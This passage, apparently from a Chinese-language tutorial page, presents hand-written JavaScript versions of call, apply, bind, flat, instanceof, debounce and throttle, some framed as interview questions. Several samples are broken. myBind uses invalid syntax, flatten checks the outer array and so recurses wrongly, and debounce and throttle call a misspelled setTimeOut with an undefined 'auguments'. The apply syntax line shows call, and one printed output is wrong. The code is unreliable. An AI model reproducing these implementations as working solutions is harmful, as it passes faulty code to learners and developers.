  <span class="token keyword">delete</span> context<span class="token punctuation">.</span>fn<span class="token punctuation">;</span> <span class="token comment">//记得恢复context哦</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span> <span class="token comment">// 返回的结果为context.fn函数的返回结果</span>
<span class="token punctuation">}</span>

test1<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&gt;</span> <span class="token string">'liujiawei'</span>
</code></pre></div><h3 id="使用场景"><a href="#使用场景" class="header-anchor">#</a> 使用场景</h3> <p><code>call()</code>提供新的 this 值给当前调用的函数/方法。你也可以使用 call 来实现继承：写一个方法，然后让另外一个新的对象来继承它（而不是在新对象中再写一次这个方法）。</p> <p>一般来说，this值的指向都是被调用的地方，比如被对象调用，被函数调用，或者直接执行也就是被全局环境调用，只有在箭头函数里面比较特殊，是指向上下文。</p> <p>但是<strong>call函数直接修改this的指向为call方法传入的第一个参数</strong>。</p> <p>下面的代码可以很简单的说明：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> test <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">'test'</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> test1 <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">'test1'</span><span class="token punctuation">,</span>
    <span class="token function-variable function">fn</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
test1<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&gt;</span> <span class="token string">'text'</span>
</code></pre></div><p>用call也可以实现继承：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Product</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> price</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">Food</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> price</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">Product</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> price<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>category <span class="token operator">=</span> <span class="token string">'food'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> cheese <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Food</span><span class="token punctuation">(</span><span class="token string">'feta'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cheese<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&gt;</span> <span class="token punctuation">{</span>category<span class="token operator">:</span> <span class="token string">&quot;food&quot;</span><span class="token punctuation">,</span>name<span class="token operator">:</span> <span class="token string">&quot;feta&quot;</span><span class="token punctuation">,</span>price<span class="token operator">:</span> <span class="token number">5</span><span class="token punctuation">}</span>

</code></pre></div><h3 id="_2-apply"><a href="#_2-apply" class="header-anchor">#</a> 2. apply</h3> <p>apply方法的作用和 call方法类似，区别就是<code>call()</code>方法接受的是<strong>参数列表</strong>，而<code>apply()</code>方法接受的是<strong>一个参数数组</strong>。</p> <h3 id="语法-2"><a href="#语法-2" class="header-anchor">#</a> 语法</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>thisArg<span class="token punctuation">,</span> <span class="token punctuation">[</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="返回值-2"><a href="#返回值-2" class="header-anchor">#</a> 返回值</h3> <p>和call方法一样，是调用者函数的执行返回的结果</p> <h3 id="手写apply的实现"><a href="#手写apply的实现" class="header-anchor">#</a> 手写apply的实现</h3> <p>基本和call一模一样，也很简单，多的只是展开传入的数组，作为传给函数的参数。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> test <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">'liujiawei'</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> test1 <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">'wuyifan'</span><span class="token punctuation">,</span>
    <span class="token function-variable function">fn</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

test1<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function-variable function">myApply</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">context</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    context<span class="token operator">=</span>context<span class="token operator">||</span>window<span class="token punctuation">;</span>
    context<span class="token punctuation">.</span>fn<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> result<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
       result<span class="token operator">=</span>context<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
       result<span class="token operator">=</span>context<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">delete</span> context<span class="token punctuation">.</span>fn<span class="token punctuation">;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

test1<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function">myApply</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'xianxian'</span><span class="token punctuation">,</span><span class="token string">'jiawei'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token operator">&gt;</span>  <span class="token string">'xianxian'</span>
</code></pre></div><h3 id="使用场景-2"><a href="#使用场景-2" class="header-anchor">#</a> 使用场景：</h3> <ul><li><p><strong>用 <code>apply</code> 将数组各项添加到另一个数组</strong></p> <p>使用concat也可以，但是concat会创建并返回一个新数组。如果我们想追加到现有数组，怎么办？</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> elements <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
array<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span>elements<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>
</code></pre></div></li> <li><p>使用<code>apply</code>和内置函数</p> <p>对于一些需要写循环以便历数组各项的需求，我们可以用<code>apply</code>完成以避免循环。比如max函数应该传入参数列表，我们可以使用apply直接传入一个数组。比如Math.max(5, 6, 2, 3, 7)。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> numbers<span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre></div><p>但是这样参数个数可能过长，超出某些引擎的限制（比如JS的参数个数上限是65536）。所以我们可以把数组切割。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">minOfArray</span><span class="token punctuation">(</span><span class="token parameter">array</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> min <span class="token operator">=</span> <span class="token number">Infinity</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token constant">QUANTUM</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> len <span class="token operator">=</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> subMin <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> array<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token constant">QUANTUM</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        min <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>subMin<span class="token punctuation">,</span> min<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> min<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> min <span class="token operator">=</span> <span class="token function">minOfArray</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>min<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&gt;</span> <span class="token number">2</span>
</code></pre></div></li> <li><p>使用apply来链接构造器，能够在构造器中使用一个类数组对象而非参数列表</p> <p>目前的new新的函数构造器传入的是参数列表，但是通过apply我们可以传入一个数组。</p> <p>//这里调试的时候有点问题，有待继续研究</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">construct</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">aArgs</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">let</span> newObject<span class="token operator">=</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>newObject<span class="token punctuation">,</span>aArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> newObject<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">MyConstructor</span> <span class="token punctuation">(</span><span class="token parameter">arguments</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> myArray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">&quot;Hello world!&quot;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> myInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyConstructor</span><span class="token punctuation">(</span>myArray<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//Fix MyConstructor.construct is not a function</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>myInstance<span class="token punctuation">.</span>construct<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li></ul> <h3 id="_3-bind"><a href="#_3-bind" class="header-anchor">#</a> 3. bind</h3> <p>bind()方法返回一个新的函数，在 <code>bind()</code> 被调用时，这个新函数的 <code>this</code> 被指定为 <code>bind()</code> 的第一个参数，而其余参数将作为新函数的参数，供调用时使用。</p> <p>call和apply都是立即执行调用他们的函数。而bind是返回这个函数，待后面调用。</p> <h3 id="手写bind的实现"><a href="#手写bind的实现" class="header-anchor">#</a> 手写bind的实现：</h3> <div class="language-js extra-class"><pre class="language-js"><code>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">myBind</span><span class="token punctuation">(</span><span class="token parameter">context</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">const</span> _this<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//bind方法去掉第一个参数后面的参数列表</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token constant">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token keyword">instanceof</span> <span class="token class-name">F</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//this是bind最后返回的函数被调用的地方</span>
      <span class="token keyword">return</span> <span class="token function">_this</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>args<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token function">_this</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span>args<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="使用场景-3"><a href="#使用场景-3" class="header-anchor">#</a> 使用场景：</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> module <span class="token operator">=</span> <span class="token punctuation">{</span>
  x<span class="token operator">:</span> <span class="token number">42</span><span class="token punctuation">,</span>
  <span class="token function-variable function">getX</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> unboundGetX <span class="token operator">=</span> module<span class="token punctuation">.</span>getX<span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">unboundGetX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// The function gets invoked at the global scope</span>
<span class="token operator">&lt;</span> <span class="token keyword">undefined</span>

<span class="token keyword">const</span> boundGetX <span class="token operator">=</span> <span class="token function">unboundGetX</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">boundGetX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span> <span class="token number">42</span>
</code></pre></div><h3 id="_4-flat"><a href="#_4-flat" class="header-anchor">#</a> 4. flat</h3> <p>手写flat的实现： (币安面试题)</p> <p>递归方法</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">flatten</span><span class="token punctuation">(</span><span class="token parameter">array</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">let</span> res<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  array<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      res<span class="token operator">=</span>res<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token function">flatten</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span>
</code></pre></div><h3 id="_5-instance-of"><a href="#_5-instance-of" class="header-anchor">#</a> 5. Instance_of</h3> <p>（币安面试题）</p> <p>一张图就可以充分的解释清楚JS里绕晕了无数人的原型链：</p> <p><img src="/assets/img/prototype.4f85e485.png" alt="Image"></p> <p>手写instanceOf方法:</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">instance_of</span><span class="token punctuation">(</span><span class="token parameter"><span class="token constant">L</span><span class="token punctuation">,</span><span class="token constant">R</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">let</span> proto <span class="token operator">=</span> <span class="token constant">L</span><span class="token punctuation">.</span>__proto__<span class="token punctuation">;</span> 
   <span class="token keyword">let</span> prototype <span class="token operator">=</span> <span class="token class-name">R</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span> 
   <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>proto<span class="token operator">===</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment">//找到原型链的终点了，和R的原型函数也不一样，说明两者不同，不是一路人，返回false</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>proto<span class="token operator">===</span>prototype<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment">//L的原型（或者原型的原型，不管多少级）和R相同，说明两者同出一脉，返回true</span>
      proto<span class="token operator">=</span>proto<span class="token punctuation">.</span>__proto__<span class="token punctuation">;</span> <span class="token comment">// 往上找L的原型，一直到出结果</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">//test</span>
<span class="token keyword">function</span> <span class="token constant">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token constant">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token function">instance_of</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token constant">A</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>
<span class="token function">instance_of</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>Object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//true</span>
<span class="token function">instance_of</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token constant">B</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//false</span>
</code></pre></div><p>另外我们可以测试:</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">instance_of</span><span class="token punctuation">(</span>Object<span class="token punctuation">,</span>Function<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Object.__proto__===Function.prototype</span>
<span class="token function">instance_of</span><span class="token punctuation">(</span>Function<span class="token punctuation">,</span>Object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Function.prototype.__proto__===Object.prototype</span>
</code></pre></div><p>至于为什么是这样的，看上面那张图就一目了然了。直接的原因就是上面代码注释的部分。</p> <h3 id="_6-debounce"><a href="#_6-debounce" class="header-anchor">#</a> 6. debounce</h3> <p>防抖函数，会从上一次被调用后，延迟 wait 毫秒后执行 fn 。名称来源于机械开关和继电器的“去弹跳”（debounce），就是将多个信号合并为一个信号。</p> <blockquote><p>注意：即使还有0.01秒就到指定时间，如果这时又执行了一次函数，那么之前的定时器就会被取消，需要重新等待delay毫秒。</p></blockquote> <h3 id="手写debounce的实现"><a href="#手写debounce的实现" class="header-anchor">#</a> 手写debounce的实现</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span>delay</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">let</span> timer<span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//每次这个返回的函数被调用，就清除定时器，所以fn一直都不会执行。</span>
    timer<span class="token operator">=</span><span class="token function">setTimeOut</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
       <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>auguments<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//最后一次的时候，不会再有下一次的清除定时器了，再过dealy毫秒fn会执行一次。</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>delay<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="_7-throttle"><a href="#_7-throttle" class="header-anchor">#</a> 7. throttle</h3> <p>节流函数，在 wait 秒内最多执行 fn 一次。名称就是固定函数执行的速率的意思，所以叫节流。</p> <h3 id="手写throttle的实现"><a href="#手写throttle的实现" class="header-anchor">#</a> 手写throttle的实现</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span>delay</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">let</span> flag<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment">// 在delay毫秒内到这里就会return，所以fn一直都不会执行</span>
     flag<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>
     <span class="token function">setTimeOut</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
        <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>auguments<span class="token punctuation">)</span> <span class="token punctuation">;</span> <span class="token comment">//执行一次，并且改变flag。</span>
        flag<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>delay<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
